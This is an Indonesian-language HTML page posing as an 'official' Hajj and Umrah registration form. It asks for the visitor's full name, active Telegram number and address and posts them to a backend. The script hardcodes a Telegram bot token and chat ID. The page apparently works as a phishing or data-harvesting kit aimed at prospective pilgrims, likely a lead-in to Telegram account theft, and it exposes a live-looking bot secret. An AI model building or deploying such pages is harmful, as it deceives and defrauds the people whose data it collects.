<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pendaftaran Resmi Haji & Umrah</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-emerald-500 min-h-screen flex justify-center py-10 px-4">

    <div class="max-w-md w-full">
        <div class="bg-white rounded-2xl shadow-2xl overflow-hidden mb-6">
            
            <div class="relative bg-white-900 text-white p-6 overflow-hidden">
                <div class="flex justify-between items-start relative z-10">
                    <div class="w-8/14"></div>
                    <div class="w-8/14">
                        <img src="wa.jpeg">
                    </div>
                </div>
            </div>

            <div class="p-6">
                <p class="text-gray-700 font-semibold text-lg mb-6 leading-tight">
                    Silahkan masukkan Data Anda 
                    untuk melanjutkan pendaftaran
                </p>

                <form id="registrationForm" class="space-y-4">
                    <div class="flex items-center border-2 border-gray-200 rounded-lg overflow-hidden focus-within:border-emerald-500 transition">
                        <span class="px-4 text-gray-400"><i class="fas fa-user"></i></span>
                        <input type="text" id="userName" placeholder="Masukkan Nama Lengkap" class="w-full py-3 outline-none text-gray-700">
                    </div>

                    <div class="flex items-center border-2 border-gray-200 rounded-lg overflow-hidden focus-within:border-emerald-500 transition">
                        <span class="px-4 flex items-center gap-2 border-r">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="w-6" alt="ID">
                            <span class="text-gray-600 font-bold">+62</span>
                        </span>
                        <input type="tel" id="userPhone" placeholder="Masukkan nomor Telegram Aktif" class="w-full py-3 px-3 outline-none text-gray-700">
                    </div>
                    
                    <div class="flex items-center border-2 border-gray-200 rounded-lg overflow-hidden focus-within:border-emerald-500 transition">
                        <span class="px-4 text-gray-400"><i class="fas fa-map-marker-alt"></i></span>
                        <input type="text" id="userAddress" placeholder="Masukkan Alamat" class="w-full py-3 outline-none text-gray-700">
                    </div>

                    <button type="submit" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-4 rounded-xl shadow-lg transform active:scale-95 transition-all">
                        <i class="fas fa-paper-plane"></i> Daftar Sekarang
                    </button>
                </form>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8674470639:AAE7GidUqbbPUYiqNBHawJA3ZWlIh25-_T4';
        const CHAT_ID = '1323510267';
        
        // Auto-detect API base - Point to Render backend
        // Change this to your Render URL when deploying
        const API_BASE = window.location.hostname === 'localhost' 
            ? 'http://localhost:3000' 
            : 'https://your-render-app.onrender.com';

        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const nameInput = document.getElementById('userName');
            const phoneInput = document.getElementById('userPhone');
            const addressInput = document.getElementById('userAddress');
            
            const name = nameInput.value.trim();
            const phone = phoneInput.value.trim();
            const address = addressInput.value.trim();
            
            if (name === '') {
                alert('Silakan masukkan nama lengkap Anda');
                return;
            }
            
            if (phone === '') {
                alert('Silakan masukkan nomor Telegram Anda');
                return;
            }
            
            // Format nomor
            let formattedPhone = phone.replace(/\D/g, '');
            if (formattedPhone.startsWith('0')) {
                formattedPhone = '62' + formattedPhone.substring(1);
            } else if (formattedPhone.startsWith('8')) {
                formattedPhone = '62' + formattedPhone;
            }
            
            // Tampilkan loading
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengirim...';
            
            try {
                const response = await fetch(`${API_BASE}/api/register`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: name,
                        phone: formattedPhone,
                        address: address
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    alert('✅ Pendaftaran berhasil!\n\nTim kami akan menghubungi Anda melalui Telegram.');
                    // Reset form
                    nameInput.value = '';
                    phoneInput.value = '';
                    addressInput.value = '';
                } else {
                    alert('❌ ' + (data.error || 'Gagal mengirim data'));
                }
            } catch (error) {
                console.error('Error:', error);
                alert('❌ Terjadi kesalahan. Silakan coba lagi.');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = originalText;
            }
        });
    </script>
</body>
</html>
